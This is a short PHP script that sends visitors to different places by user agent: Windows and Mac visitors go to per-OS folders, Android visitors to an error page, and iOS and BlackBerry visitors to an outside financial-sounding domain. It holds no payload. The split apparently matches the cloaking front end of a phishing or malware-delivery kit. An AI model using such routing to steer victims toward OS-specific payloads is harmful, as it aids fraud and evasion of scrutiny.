<?php
// Get the user agent once to keep code clean
$ua = $_SERVER['HTTP_USER_AGENT'];

// Detect specific strings
$is_iphone  = (strpos($ua, "iPhone") !== false);
$is_ipod    = (strpos($ua, "iPod") !== false);
$is_ipad    = (strpos($ua, "iPad") !== false);
$is_berry   = (strpos($ua, "BlackBerry") !== false);
$is_android = (strpos($ua, "Android") !== false);
$is_windows = (strpos($ua, "Windows") !== false);

$is_mac     = (strpos($ua, "Macintosh") !== false) && !$is_iphone && !$is_ipod && !$is_ipad;

// --- Logic Flow ---

if ($is_windows) {
    header('Location: Windows/');
    exit;
}


if ($is_android) {
    header('Location: Device-error.php/');
    exit;
}


if ($is_mac) {
    header('Location: Mac/');
    exit;
}

// iPhone, iPad, iPod, and BlackBerry
if ($is_iphone || $is_ipod || $is_ipad || $is_berry) {
    header('Location: https://gandrudsfinancial.com');
    exit;
}
?>
